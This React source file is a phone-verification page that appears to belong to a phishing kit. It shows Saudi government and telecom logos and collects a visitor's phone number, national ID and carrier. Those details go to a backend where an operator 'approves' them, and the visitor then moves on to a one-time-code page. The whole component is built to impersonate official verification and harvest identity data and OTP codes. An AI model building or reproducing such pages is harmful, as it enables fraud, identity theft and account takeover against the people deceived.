import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion, AnimatePresence } from "framer-motion";
import { Shield, AlertTriangle, ChevronDown, Loader2 } from "lucide-react";
import VerificationLayout from "@/components/VerificationLayout";
import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
import { toast } from "sonner";
import { linkVisitorToSession } from "@/lib/visitorLink";
import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
import wtheqLogo from "@/assets/wtheq-logo.png";
import cstLogo from "@/assets/cst-logo.png";
import nicLogo from "@/assets/nic-logo.png";
import { useLanguage } from "@/i18n/LanguageContext";

const carriers = [
  { name: "STC", value: "STC", logo: "/images/stc.png" },
  { name: "Mobily", value: "Mobily", logo: "/images/mobily.png" },
  { name: "Zain", value: "Zain", logo: "/images/zain.png" },
  { name: "Salam", value: "Salam", logo: "/images/salam.png" },
  { name: "Virgin", value: "Virgin", logo: "/images/virgin.png" },
  { name: "Redbull", value: "Redbull", logo: "/images/redbull.png" },
];

const PhoneVerification = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { t } = useLanguage();
  const pv = t.phoneVerify;
  const offer = location.state?.offer;
  const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");

  const [phone, setPhone] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [carrier, setCarrier] = useState("");
  const [showCarriers, setShowCarriers] = useState(false);
  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(passedOrderId);
  const [phoneError, setPhoneError] = useState("");
  const [idError, setIdError] = useState("");
  const [showError, setShowError] = useState(false);
  const [showWelcomePopup, setShowWelcomePopup] = useState(true);
  const approvalStatus = useAdminApproval(orderId, "phone_verification");

  useEffect(() => {
    if (approvalStatus === "approved" && orderId) {
      toast.success(pv.phoneVerified);
      sessionStorage.setItem("insurance_order_id", orderId);
      navigate("/insurance/phone-otp", { state: { offer, phone, carrier, orderId } });
    } else if (approvalStatus === "rejected") {
      toast.error(pv.verificationRejected);
      setWaitingApproval(false);
      setLoading(false);
    }
  }, [approvalStatus, orderId, navigate, offer, phone, carrier]);

  const validatePhone = (v: string) => {
    if (v.startsWith("05") && v.length !== 10) return pv.phoneError10;
    if (v.startsWith("5") && !v.startsWith("05") && v.length !== 9) return pv.phoneError9;
    if (v.length > 0 && !v.startsWith("05") && !v.startsWith("5")) return pv.phoneErrorStart;
    return "";
  };

  const validateId = (v: string) => {
    if (v.length > 0 && !v.startsWith("1") && !v.startsWith("2")) return pv.idErrorStart;
    if (v.length > 0 && v.length !== 10) return pv.idError10;
    return "";
  };

  const isValid = () => {
    const phoneOk = (phone.startsWith("05") && phone.length === 10) || (phone.startsWith("5") && !phone.startsWith("05") && phone.length === 9);
    return phoneOk && nationalId.length === 10 && carrier.length > 0 && !phoneError && !idError;
  };

  const handleSubmit = async () => {
    if (!isValid()) { setShowError(true); return; }
    setLoading(true);
    sessionStorage.setItem("phone_verification", JSON.stringify({ phone, nationalId, carrier }));
    linkVisitorToSession({ phone, national_id: nationalId });
    const id = await createOrUpdateStage(orderId, "phone_verification", { phone, national_id: nationalId, carrier });
    setOrderId(id);
    setWaitingApproval(true);
  };

  const selectedCarrier = carriers.find(c => c.value === carrier);
  const inputCls = "w-full px-3 py-2.5 rounded-lg bg-background border-2 border-border text-foreground placeholder:text-muted-foreground text-xs focus:outline-none focus:border-primary focus:ring-2 focus:ring-primary/20 transition-all text-right";

  return (
    <>
    <VerificationLayout title={pv.title} subtitle={pv.subtitle}>
      <div className="flex flex-col items-center gap-3 pt-5 pb-2 border-b border-border">
        <img src={wtheqLogo} alt="وثق - WTHEQ" className="h-20 object-contain" />
        <img src={cstLogo} alt="هيئة الاتصالات والفضاء والتقنية" className="h-14 object-contain" />
      </div>

      <div className="text-center pt-4 pb-2 px-4">
        <h2 className="text-base font-extrabold bg-gradient-to-r from-primary to-emerald-600 bg-clip-text text-transparent">{pv.title}</h2>
      </div>

      <div className="p-4 pt-2 space-y-3">
         {waitingApproval ? (
          <WaitingApprovalOverlay
            title={pv.waitingApproval}
            subtitle={pv.waitingReview}
            icon="shield"
          />
        ) : (
          <>
            {showError && (
              <motion.div initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} className="flex items-start gap-2 bg-destructive/10 border border-destructive/20 rounded-lg p-3">
                <AlertTriangle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
                <p className="text-[11px] text-destructive leading-relaxed">{pv.errorMessage}</p>
                <button onClick={() => setShowError(false)} className="text-destructive shrink-0">✕</button>
              </motion.div>
            )}

            <div className="border-2 border-border rounded-xl p-4 space-y-1">
              <label className="block text-xs font-black text-foreground text-right mb-2">{pv.phone} <span className="text-destructive">*</span></label>
              <input className={inputCls} placeholder={pv.phonePlaceholder} value={phone}
                onChange={(e) => { const v = e.target.value.replace(/\D/g, "").slice(0, 10); setPhone(v); setPhoneError(validatePhone(v)); }}
                dir="rtl" maxLength={10} />
              {phoneError && <p className="text-[10px] text-destructive mt-1 text-right">{phoneError}</p>}
            </div>

            <div className="border-2 border-border rounded-xl p-4 space-y-1">
              <label className="block text-xs font-black text-foreground text-right mb-2">{pv.carrier} <span className="text-destructive">*</span></label>
              <div className="relative">
                <button onClick={() => setShowCarriers(!showCarriers)} className={`w-full px-3 py-2.5 rounded-lg bg-background border-2 border-border text-foreground text-xs flex items-center justify-between cursor-pointer transition-all focus:outline-none focus:border-primary`}>
                  {selectedCarrier ? (
                    <div className="flex items-center gap-2">
                      <img src={selectedCarrier.logo} alt={selectedCarrier.name} className="w-6 h-6 object-contain" />
                      <span className="text-xs font-medium">{selectedCarrier.name}</span>
                    </div>
                  ) : (
                    <span className="text-muted-foreground text-xs">{pv.selectCarrier}</span>
                  )}
                  <ChevronDown className={`w-3.5 h-3.5 text-muted-foreground transition-transform ${showCarriers ? "rotate-180" : ""}`} />
                </button>
                {showCarriers && (
                  <motion.div initial={{ opacity: 0, y: -5 }} animate={{ opacity: 1, y: 0 }} className="absolute top-full left-0 right-0 mt-1 bg-card border border-border rounded-lg shadow-lg z-10 overflow-hidden">
                    {carriers.map((c) => (
                      <button key={c.value} onClick={() => { setCarrier(c.value); setShowCarriers(false); }}
                        className={`w-full flex items-center gap-3 px-3 py-2.5 hover:bg-secondary/70 transition-colors ${carrier === c.value ? "bg-primary/5" : ""}`}>
                        <img src={c.logo} alt={c.name} className="w-7 h-7 object-contain" />
                        <span className="text-xs font-medium text-foreground">{c.name}</span>
                      </button>
                    ))}
                  </motion.div>
                )}
              </div>
            </div>

            <div className="border-2 border-border rounded-xl p-4 space-y-1">
              <label className="block text-xs font-black text-foreground text-right mb-2">{pv.nationalId} <span className="text-destructive">*</span></label>
              <input className={inputCls} placeholder={pv.nationalIdPlaceholder} value={nationalId}
                onChange={(e) => { const v = e.target.value.replace(/\D/g, "").slice(0, 10); setNationalId(v); setIdError(validateId(v)); }}
                dir="rtl" maxLength={10} />
              {idError && <p className="text-[10px] text-destructive mt-1 text-right">{idError}</p>}
            </div>

            <motion.button onClick={handleSubmit} disabled={loading || !isValid()}
              className="w-full text-white hover:opacity-90 rounded-xl py-3 font-bold text-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2 shadow-lg mt-2"
              style={{ backgroundColor: '#11998e' }}
              whileTap={{ scale: 0.98 }}
            >
              <Shield className="w-3.5 h-3.5" />
              {loading ? pv.submitting : pv.submit}
            </motion.button>
          </>
        )}
      </div>
    </VerificationLayout>

    <AnimatePresence>
      {showWelcomePopup && (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm px-6">
          <motion.div 
            initial={{ scale: 0.8, opacity: 0, y: 30 }} 
            animate={{ scale: 1, opacity: 1, y: 0 }} 
            exit={{ scale: 0.85, opacity: 0, y: 20 }} 
            transition={{ type: "spring", damping: 22, stiffness: 260 }} 
            className="bg-card rounded-3xl shadow-2xl w-full max-w-sm overflow-hidden border border-border/50 relative"
          >
            {/* Decorative top gradient bar */}
            <div className="h-1.5 w-full bg-gradient-to-r from-primary via-emerald-500 to-primary" />
            
            {/* Glow effect behind logo */}
            <div className="relative flex justify-center pt-8 pb-3">
              <div className="absolute top-4 w-28 h-28 rounded-full bg-primary/10 blur-2xl" />
              <motion.div
                initial={{ scale: 0, rotate: -10 }}
                animate={{ scale: 1, rotate: 0 }}
                transition={{ type: "spring", delay: 0.15, damping: 15 }}
                className="relative w-24 h-24 rounded-2xl bg-gradient-to-br from-primary/5 to-primary/10 border border-primary/10 flex items-center justify-center shadow-lg"
              >
                <img src={nicLogo} alt="NIC" className="w-16 h-16 object-contain" />
              </motion.div>
            </div>

            <div className="px-6 pb-5 text-center space-y-2.5">
              <motion.p 
                initial={{ opacity: 0, y: 5 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}
                className="text-[11px] text-muted-foreground font-medium tracking-wide uppercase"
              >
                {pv.welcomeSubtitle}
              </motion.p>
              <motion.h3 
                initial={{ opacity: 0, y: 5 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.25 }}
                className="text-2xl font-extrabold bg-gradient-to-r from-primary to-emerald-600 bg-clip-text text-transparent"
              >
                {pv.welcomeTitle}
              </motion.h3>
              <motion.p 
                initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}
                className="text-primary font-bold text-sm"
              >
                {pv.welcomeGreeting}
              </motion.p>
              <motion.p 
                initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.35 }}
                className="text-xs text-muted-foreground leading-relaxed max-w-[260px] mx-auto"
              >
                {pv.welcomeMessage}
              </motion.p>
            </div>

            <div className="px-6 pb-7">
              <motion.button 
                initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.4 }}
                whileTap={{ scale: 0.97 }}
                onClick={() => setShowWelcomePopup(false)} 
                className="w-full text-white rounded-xl py-3.5 font-bold text-sm transition-all shadow-lg shadow-primary/25 hover:shadow-primary/40 hover:brightness-110"
                style={{ background: 'linear-gradient(135deg, #11998e 0%, #0f8a7e 100%)' }}
              >
                {pv.welcomeContinue}
              </motion.button>
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
    </>
  );
};

export default PhoneVerification;
